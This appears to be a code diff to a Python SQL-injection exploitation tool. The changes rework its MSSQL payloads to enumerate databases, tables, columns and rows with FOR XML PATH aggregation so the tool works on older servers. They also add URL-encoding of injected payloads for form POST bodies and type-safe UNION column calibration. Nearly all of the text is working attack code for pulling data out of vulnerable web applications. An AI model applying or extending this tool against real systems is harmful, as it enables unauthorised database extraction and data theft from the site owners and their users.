@@ -38,6 +38,7 @@ import time
 import shutil
 import threading
 from collections import deque
+from urllib.parse import quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 try:
@@ -156,18 +157,26 @@ def _mssql():
             "; IF(({cond})) WAITFOR DELAY '0:0:{d}'",        # stacked
         ],
         "version": "SELECT @@version",
-        # STRING_AGG (SQL Server 2017+); fallback to FOR XML if needed.
-        "dbs":    "SELECT STRING_AGG(name,CHAR(44)) FROM sys.databases",
+        # Concatenate rows with the FOR XML PATH('')+STUFF trick, which works on
+        # every SQL Server since 2005. (STRING_AGG would be cleaner but only
+        # exists on 2017+, so older targets like many retired boxes fail on it.)
+        "dbs":    ("SELECT STUFF((SELECT CHAR(44)+name FROM sys.databases "
+                   "FOR XML PATH('')),1,1,'')"),
         "tables": lambda db: (
-            f"SELECT STRING_AGG(table_name,CHAR(44)) FROM {db}.information_schema.tables"),
+            f"SELECT STUFF((SELECT CHAR(44)+table_name FROM "
+            f"{db}.information_schema.tables FOR XML PATH('')),1,1,'')"),
         "columns": lambda db, t: (
-            f"SELECT STRING_AGG(column_name,CHAR(44)) FROM {db}.information_schema.columns "
-            f"WHERE table_name='{t}'"),
+            f"SELECT STUFF((SELECT CHAR(44)+column_name FROM "
+            f"{db}.information_schema.columns WHERE table_name='{t}' "
+            f"FOR XML PATH('')),1,1,'')"),
         "col_concat": lambda cols: "+CHAR(58)+".join(
             [f"CAST({c} AS NVARCHAR(4000))" for c in cols]),
-        "rows_agg": lambda expr, db, t: f"SELECT STRING_AGG({expr},CHAR(44)) FROM {db}..{t}",
+        "rows_agg": lambda expr, db, t: (
+            f"SELECT STUFF((SELECT CHAR(44)+{expr} FROM {db}..{t} "
+            f"FOR XML PATH('')),1,1,'')"),
         "single_col": lambda c, db, t: (
-            f"SELECT STRING_AGG(CAST({c} AS NVARCHAR(4000)),CHAR(44)) FROM {db}..{t}"),
+            f"SELECT STUFF((SELECT CHAR(44)+CAST({c} AS NVARCHAR(4000)) FROM "
+            f"{db}..{t} FOR XML PATH('')),1,1,'')"),
         "current_db": "SELECT DB_NAME()",
         "ifexpr": lambda c, a, b: f"(CASE WHEN ({c}) THEN {a} ELSE {b} END)",
         "eq_hex": lambda sub, start, n, h: (
@@ -437,6 +446,11 @@ class Sender:
         # starts returning ambiguous/error pages under load, so a flaky box is
         # handled by slowing down rather than by guessing.
         self.throttle = max(0.0, getattr(args, "throttle", 0.0) or 0.0)
+        # URL-encode the spliced payload. Required when injecting into a
+        # form-urlencoded POST body (or a query value), where raw '+', '=', '&'
+        # and spaces in a SQL payload would otherwise be mangled by the server's
+        # form parser (e.g. MSSQL '+' concat decoding to a space).
+        self.url_encode = bool(getattr(args, "url_encode", False))
 
     def attach_csrf(self, refresher, field):
         """Enable per-request CSRF token refresh. The token is scraped fresh
@@ -457,7 +471,8 @@ class Sender:
         return url, headers, body
 
     def send(self, payload):
-        url, headers, body = self.tmpl._splice(payload)
+        splice = quote(payload, safe="") if self.url_encode else payload
+        url, headers, body = self.tmpl._splice(splice)
         # requests sets its own Content-Length/Host; drop stale ones
         headers.pop("Content-Length", None)
         # CSRF: scrape + splice a fresh token right before sending
@@ -1183,17 +1198,34 @@ def choose(items, label):
 # UNION COLUMN CALIBRATION
 # ===========================================================================
 
-def union_calibrate(sender, tmpl_str, max_cols=20):
-    """Find column count + a visible position by planting hex markers."""
-    def marker(i):
-        return f"qzq{i}qzq"
+def union_calibrate(sender, tmpl_str, prof, max_cols=20):
+    """Find the column count AND a visible, string-typed column position.
+
+    Plants a text marker in ONE column at a time with NULL in the others. This
+    matters on strict-typed engines (MSSQL, Postgres): forcing a string into an
+    int column errors the whole UNION, so an all-columns marker (fine on MySQL)
+    finds nothing there. One-at-a-time with NULLs skips the incompatible columns
+    and lands on a varchar one. The marker literal is also DBMS-correct: a bare
+    0x hex on MySQL (no quotes needed), a quoted string elsewhere (0x is binary
+    on MSSQL and would never render as the marker text)."""
+    name = prof["name"]
+    def lit(i):
+        m = f"qzq{i}qzq"
+        if name == "mysql":
+            return f"0x{m.encode().hex()}", m
+        return f"'{m}'", m
     for k in range(1, max_cols + 1):
-        cols = [f"0x{marker(i).encode().hex()}" for i in range(k)]
-        payload = tmpl_str.replace(INJECT, ",".join(cols))
-        text = sender.send(payload).text
-        visible = [i for i in range(k) if marker(i) in text]
-        if visible:
-            return k, visible[0]
+        for p in range(k):
+            cols = ["NULL"] * k
+            expr, needle = lit(p)
+            cols[p] = expr
+            payload = tmpl_str.replace(INJECT, ",".join(cols))
+            try:
+                text = sender.send(payload).text
+            except Exception:
+                continue
+            if needle in text:
+                return k, p
     return None, None
 
 
@@ -1331,6 +1363,11 @@ examples:
                            "keep at 1 on flaky boxes - concurrency worsens them)")
     conn.add_argument("--timeout", type=float, default=30, help="request timeout s")
     conn.add_argument("--proxy", help="proxy, e.g. http://127.0.0.1:8080 (Burp)")
+    conn.add_argument("-e", "--url-encode", dest="url_encode", action="store_true",
+                      help="URL-encode the payload before splicing it in. Use for "
+                           "form-urlencoded POST bodies / query values so '+', '=', "
+                           "'&' and spaces in the SQL survive the server's parser "
+                           "(needed e.g. for MSSQL '+' concat in an ASP.NET POST).")
     conn.add_argument("--csrf-url", help="GET this URL to scrape a fresh anti-CSRF "
                       "token before each request")
     conn.add_argument("--csrf-field", help="form field name of that token (e.g. _token)")
@@ -1404,7 +1441,9 @@ def main():
         print(f"[*] CSRF refresh on: scraping '{args.csrf_field}' from {args.csrf_url}")
 
     # ---- validate match engine where required ----------------------------
-    needs_match = args.technique in ("boolean", "time")
+    # Only boolean needs a TRUE/FALSE match condition; time uses response delay,
+    # error/union read reflected data - none of those use the match engine.
+    needs_match = args.technique == "boolean"
     two_signal = bool(args.true_text and args.false_text)
     if (args.true_text and not args.false_text) or (args.false_text and not args.true_text):
         parser.error("--true-text and --false-text must be given together "
@@ -1464,10 +1503,11 @@ def main():
 
     elif args.technique == "union":
         print("[*] calibrating union columns...")
-        ncols, pos = union_calibrate(sender, payload_tmpl)
+        ncols, pos = union_calibrate(sender, payload_tmpl, prof)
         if ncols is None:
             print("[!] no UNION reflection found. Check column count / break-out, "
-                  "or output isn't reflected (use boolean/error/time).")
+                  "or output isn't reflected on this page (try --technique error, "
+                  "or boolean/time).")
             sys.exit(1)
         print(f"[+] columns={ncols} visible position={pos}")
         oracle = UnionOracle(sender, payload_tmpl, prof, ncols, pos,
